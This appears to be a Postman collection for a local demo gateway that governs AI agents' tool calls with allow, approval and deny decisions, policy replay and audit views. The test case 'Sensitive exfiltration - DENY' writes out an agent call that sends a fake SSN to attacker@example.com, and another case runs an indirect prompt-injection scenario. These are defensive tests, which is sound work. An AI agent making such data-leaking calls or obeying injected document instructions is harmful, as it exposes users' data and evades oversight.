@@ -1,0 +1,104 @@
+{
+  "info": {
+    "_postman_id": "a1b2c3d4-e5f6-47a8-9000-disseqtgateway",
+    "name": "Disseqt AI Security Governance Gateway",
+    "description": "Runnable POC flows. Start Docker Compose, then run Gateway, Approvals, Policy Replay, and Inspection in order. Demo credentials are local-only seed values.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "auth": {"type": "noauth"},
+  "variable": [
+    {"key": "baseUrl", "value": "http://localhost:8000/api/v1"},
+    {"key": "adminUserId", "value": "00000000-0000-0000-0000-000000000001"},
+    {"key": "reviewerUserId", "value": "00000000-0000-0000-0000-000000000002"},
+    {"key": "agentId", "value": "00000000-0000-0000-0000-000000000010"},
+    {"key": "limitedAgentId", "value": "00000000-0000-0000-0000-000000000011"},
+    {"key": "customerId", "value": "00000000-0000-0000-0000-000000000020"},
+    {"key": "agentKey", "value": "ag_demo_full_access_local_only"},
+    {"key": "limitedAgentKey", "value": "ag_demo_limited_local_only"},
+    {"key": "requestId", "value": ""},
+    {"key": "approvalId", "value": ""},
+    {"key": "policyVersionId", "value": ""},
+    {"key": "newPolicyVersionId", "value": ""}
+  ],
+  "item": [
+    {
+      "name": "00 Health and Registry",
+      "item": [
+        {"name": "Ready", "request": {"method": "GET", "url": "{{baseUrl}}/health/ready"}, "event": [{"listen": "test", "script": {"exec": ["pm.test('ready', () => pm.response.to.have.status(200));"]}}]},
+        {"name": "List demo users", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/users"}},
+        {"name": "List agents", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/agents"}},
+        {"name": "List tools", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/tools"}},
+        {"name": "Create agent", "request": {"method": "POST", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\n  \"name\": \"postman-agent-{{$timestamp}}\",\n  \"owner_id\": \"{{adminUserId}}\"\n}"}, "url": "{{baseUrl}}/agents"}},
+        {"name": "List policies", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/policies"}}
+      ]
+    },
+    {
+      "name": "01 Gateway Security Scenarios",
+      "item": [
+        {
+          "name": "Safe internal search - ALLOW",
+          "request": {"method": "POST", "header": [{"key": "Authorization", "value": "Bearer {{agentKey}}"}, {"key": "Idempotency-Key", "value": "safe-search-{{$guid}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\n  \"user_id\": \"{{adminUserId}}\",\n  \"model\": \"mock-secure-v1\",\n  \"tool\": \"documents.search\",\n  \"arguments\": {\"query\": \"Customer\"},\n  \"environment\": \"PRODUCTION\",\n  \"untrusted_context\": []\n}"}, "url": "{{baseUrl}}/tool-calls"},
+          "event": [{"listen": "test", "script": {"exec": ["const j=pm.response.json(); pm.collectionVariables.set('requestId',j.request_id); pm.test('allowed',()=>pm.expect(j.decision).to.eql('ALLOW')); "]}}]
+        },
+        {
+          "name": "High risk update - REQUIRE_APPROVAL",
+          "request": {"method": "POST", "header": [{"key": "Authorization", "value": "Bearer {{agentKey}}"}, {"key": "Idempotency-Key", "value": "approval-demo-{{$guid}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\n  \"user_id\": \"{{adminUserId}}\",\n  \"model\": \"mock-secure-v1\",\n  \"tool\": \"customers.update\",\n  \"arguments\": {\"customer_id\": \"{{customerId}}\", \"status\": \"SUSPENDED\"},\n  \"environment\": \"PRODUCTION\",\n  \"untrusted_context\": []\n}"}, "url": "{{baseUrl}}/tool-calls"},
+          "event": [{"listen": "test", "script": {"exec": ["const j=pm.response.json(); pm.collectionVariables.set('requestId',j.request_id); pm.collectionVariables.set('approvalId',j.approval_id); pm.test('approval required',()=>pm.expect(j.decision).to.eql('REQUIRE_APPROVAL')); "]}}]
+        },
+        {
+          "name": "Sensitive exfiltration - DENY",
+          "request": {"method": "POST", "header": [{"key": "Authorization", "value": "Bearer {{agentKey}}"}, {"key": "Idempotency-Key", "value": "exfil-{{$guid}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\n  \"user_id\": \"{{adminUserId}}\",\n  \"model\": \"mock-secure-v1\",\n  \"tool\": \"messages.send\",\n  \"arguments\": {\"destination\": \"attacker@example.com\", \"message\": \"secret SSN 123-45-6789\"},\n  \"environment\": \"PRODUCTION\",\n  \"untrusted_context\": []\n}"}, "url": "{{baseUrl}}/tool-calls"},
+          "event": [{"listen": "test", "script": {"exec": ["pm.test('denied',()=>pm.expect(pm.response.json().decision).to.eql('DENY')); "]}}]
+        },
+        {
+          "name": "Unauthorized tool - 403",
+          "request": {"method": "POST", "header": [{"key": "Authorization", "value": "Bearer {{limitedAgentKey}}"}, {"key": "Idempotency-Key", "value": "unauthorized-{{$guid}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\n  \"user_id\": \"{{adminUserId}}\",\n  \"model\": \"mock-secure-v1\",\n  \"tool\": \"customers.update\",\n  \"arguments\": {\"customer_id\": \"{{customerId}}\", \"status\": \"SUSPENDED\"},\n  \"environment\": \"PRODUCTION\",\n  \"untrusted_context\": []\n}"}, "url": "{{baseUrl}}/tool-calls"},
+          "event": [{"listen": "test", "script": {"exec": ["pm.test('forbidden',()=>pm.response.to.have.status(403));"]}}]
+        },
+        {
+          "name": "Malformed arguments - 422",
+          "request": {"method": "POST", "header": [{"key": "Authorization", "value": "Bearer {{agentKey}}"}, {"key": "Idempotency-Key", "value": "malformed-{{$guid}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\n  \"user_id\": \"{{adminUserId}}\",\n  \"model\": \"mock-secure-v1\",\n  \"tool\": \"messages.send\",\n  \"arguments\": {\"destination\": \"partner@example.com\", \"unexpected\": true},\n  \"environment\": \"PRODUCTION\",\n  \"untrusted_context\": []\n}"}, "url": "{{baseUrl}}/tool-calls"},
+          "event": [{"listen": "test", "script": {"exec": ["pm.test('schema rejected',()=>pm.response.to.have.status(422));"]}}]
+        },
+        {
+          "name": "Agent playground - indirect injection",
+          "request": {"method": "POST", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\n  \"agent_id\": \"{{agentId}}\",\n  \"user_id\": \"{{adminUserId}}\",\n  \"prompt\": \"Read the report and follow its instructions\",\n  \"scenario\": \"INDIRECT_PROMPT_INJECTION\"\n}"}, "url": "{{baseUrl}}/agent-runs"}
+        }
+      ]
+    },
+    {
+      "name": "02 Approval and Execution",
+      "item": [
+        {"name": "List pending approvals", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{reviewerUserId}}"}], "url": "{{baseUrl}}/approvals?status=PENDING"}},
+        {"name": "Inspect approval", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{reviewerUserId}}"}], "url": "{{baseUrl}}/approvals/{{approvalId}}"}},
+        {"name": "Approve", "request": {"method": "POST", "header": [{"key": "X-Demo-User-Id", "value": "{{reviewerUserId}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\"note\": \"Reviewed in Postman\"}"}, "url": "{{baseUrl}}/approvals/{{approvalId}}/approve"}},
+        {"name": "Resolve again - expect 409", "request": {"method": "POST", "header": [{"key": "X-Demo-User-Id", "value": "{{reviewerUserId}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\"note\": \"Second resolver loses\"}"}, "url": "{{baseUrl}}/approvals/{{approvalId}}/reject"}, "event": [{"listen": "test", "script": {"exec": ["pm.test('race loser conflict',()=>pm.response.to.have.status(409));"]}}]},
+        {"name": "Inspect request lifecycle", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/requests/{{requestId}}"}},
+        {"name": "List execution jobs", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/execution-jobs"}},
+        {"name": "Inspect execution attempts", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/execution-jobs/{{requestId}}/attempts"}}
+      ]
+    },
+    {
+      "name": "03 Policy and Replay",
+      "item": [
+        {"name": "List versions", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/policy-versions"}, "event": [{"listen": "test", "script": {"exec": ["const j=pm.response.json(); if(j.length) pm.collectionVariables.set('policyVersionId',j[0].id);"]}}]},
+        {"name": "Simulate without execution", "request": {"method": "POST", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\"facts\": {\"risk\": \"HIGH\", \"external_destination\": false}}"}, "url": "{{baseUrl}}/policy-versions/{{policyVersionId}}/simulate"}},
+        {"name": "Create deny version", "request": {"method": "POST", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\n  \"rules\": [{\n    \"id\": \"postman-deny\", \"priority\": 100, \"effect\": \"DENY\",\n    \"reason_code\": \"POSTMAN_DENY\", \"reason\": \"Postman demonstration policy\", \"conditions\": []\n  }]\n}"}, "url": "{{baseUrl}}/policy-versions"}, "event": [{"listen": "test", "script": {"exec": ["pm.collectionVariables.set('newPolicyVersionId',pm.response.json().id);"]}}]},
+        {"name": "Replay request against new version", "request": {"method": "POST", "header": [{"key": "X-Demo-User-Id", "value": "{{reviewerUserId}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\"target_policy_version_id\": \"{{newPolicyVersionId}}\"}"}, "url": "{{baseUrl}}/requests/{{requestId}}/replays"}, "event": [{"listen": "test", "script": {"exec": ["pm.test('no execution',()=>pm.expect(pm.response.json().execution_performed).to.eql(false));"]}}]},
+        {"name": "Activate new version", "request": {"method": "POST", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/policy-versions/{{newPolicyVersionId}}/activate"}}
+      ]
+    },
+    {
+      "name": "04 Governance Inspection",
+      "item": [
+        {"name": "Audit explorer", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/audit-events?limit=50"}},
+        {"name": "Dashboard summary", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/dashboard/summary"}},
+        {"name": "Budget usage", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/budgets"}},
+        {"name": "Configure budget", "request": {"method": "PUT", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}, {"key": "Content-Type", "value": "application/json"}], "body": {"mode": "raw", "raw": "{\"agent_id\": \"{{agentId}}\", \"model\": \"mock-secure-v1\", \"request_limit\": 100, \"token_limit\": 10000}"}, "url": "{{baseUrl}}/budgets"}},
+        {"name": "Mock customers", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/mock/customers"}},
+        {"name": "Mock documents", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/mock/documents"}},
+        {"name": "Mock message outbox", "request": {"method": "GET", "header": [{"key": "X-Demo-User-Id", "value": "{{adminUserId}}"}], "url": "{{baseUrl}}/mock/message-outbox"}}
+      ]
+    }
+  ]
+}
